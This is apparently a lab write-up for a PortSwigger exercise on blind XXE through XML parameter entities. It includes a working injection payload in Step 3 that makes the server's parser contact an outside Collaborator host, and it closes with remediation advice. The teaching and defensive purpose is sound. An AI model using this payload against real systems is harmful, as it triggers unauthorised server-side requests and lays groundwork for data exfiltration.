# Blind XXE with Out-of-Band Interaction via XML Parameter Entities

**Platform:** PortSwigger Web Security Academy
**Category:** XXE Injection
**Difficulty:** Apprentice
**Status:** ✅ Solved

## Background

XML has a second kind of entity that is easy to overlook. **Parameter entities** are declared with a percent sign — `<!ENTITY % name "value">` — and referenced as `%name;`. They exist only inside the DTD itself, where they are used to build and reuse declarations. That DTD-only nature is precisely what makes them useful to an attacker: regular general entities (`&xxe;`) are sometimes blocked by input validation or disabled by parser hardening, while parameter entities are processed earlier, during DTD evaluation, and are frequently left enabled. A parameter entity pointing at an attacker server can therefore trigger an out-of-band interaction even when the classic payload fails — and because it is referenced inside the DTD, it does not need any element in the document body at all.

## Lab Objective

The application uses the XML-based stock checker and is vulnerable to blind XXE. This time, exploit the vulnerability using **XML parameter entities** to trigger an out-of-band interaction with Burp Collaborator, confirming the blind XXE.

**Provided resources:** the lab shop application and Burp Suite's Collaborator.

<img width="2166" height="1191" alt="step-1" src="https://github.com/user-attachments/assets/7f2d592b-6d74-4bd3-87e6-efcfd3f3b85d" />


## Walkthrough

### Step 1: Find the XML Input

Open a product page, use **Check stock**, and send the `POST /product/stock` request to Burp Repeater — the same XML `stockCheck` body as the earlier labs.

<img width="3167" height="1754" alt="step-2" src="https://github.com/user-attachments/assets/b7fba23e-5e92-4237-bcd1-63690f7df427" />


<img width="2535" height="1423" alt="step-3" src="https://github.com/user-attachments/assets/04bfca21-8239-46ce-af98-0c5c69b995a1" />


<img width="2476" height="1060" alt="step-4" src="https://github.com/user-attachments/assets/0de74978-44d2-4d3f-82c0-ecc37d0de318" />


### Step 2: Generate a Collaborator Payload

In the Collaborator tab, click **Copy to clipboard** to generate the unique payload hostname for this session.

<img width="2238" height="867" alt="step-5" src="https://github.com/user-attachments/assets/f9a96f79-482f-4d73-bfdd-66d1aada9b6a" />


### Step 3: Inject the Parameter Entity

Insert a DOCTYPE between the XML declaration and the `stockCheck` element. This time the entity is declared as a parameter entity and referenced *inside the DTD itself*, so the document body is left completely untouched:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR-PAYLOAD.oastify.com"> %xxe; ]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

Two details do all the work:

- `% xxe` in the declaration marks this as a parameter entity.
- `%xxe;` immediately after it forces the parser to resolve the entity *while processing the DTD* — before it ever looks at `stockCheck`.

Send the request. The response is an unhelpful **"XML parsing error"** — the application rejected the document. On its own that looks like failure, but DTD processing happens first: the fetch may already have been made on the way to that error.

<img width="2538" height="1254" alt="step-6" src="https://github.com/user-attachments/assets/5c269aef-dcbc-41f8-9842-2eca7677918a" />


### Step 4: Poll Collaborator and Observe the Interaction

In the Collaborator tab, click **Poll now**. The payload shows **DNS and HTTP interactions** from the lab server's infrastructure.

The interactions settle the question: despite the error response, the parser resolved the external parameter entity and contacted the attacker server. Blind XXE via parameter entities is confirmed, and triggering the interaction solves the lab.

<img width="2434" height="618" alt="step-7" src="https://github.com/user-attachments/assets/5894591a-fcba-4ef6-9b21-b0be28372f5c" />


<img width="3074" height="1312" alt="step-8" src="https://github.com/user-attachments/assets/d806b60b-9ec7-49b9-8830-faeb5fa6fd14" />


## Key Takeaways

- Parameter entities are the fallback that parser hardening often misses: a configuration that blocks general external entities in the document body may still process `%` entities inside the DTD.
- The trigger point differs: a parameter entity fires during DTD evaluation, so no element reference is needed — and the fetch can happen even when the document is ultimately rejected with a parsing error.
- An error response is not a negative result in blind testing. The out-of-band channel, not the application's response, is the source of truth.
- This DTD-internal mechanism is also the foundation for the more advanced blind attacks: external DTDs and error-based exfiltration in the following labs are both built from parameter entities.

## Remediation

Disable DTD processing entirely where possible; if DTDs must be supported, disable **both** general and parameter external entities and external DTD loading — hardening only the general-entity path leaves this variant open. Apply the same egress filtering as for any SSRF/OAST risk, and treat parser errors on user-supplied XML as events worth logging: here, the "XML parsing error" was the only in-band trace of a successful attack.
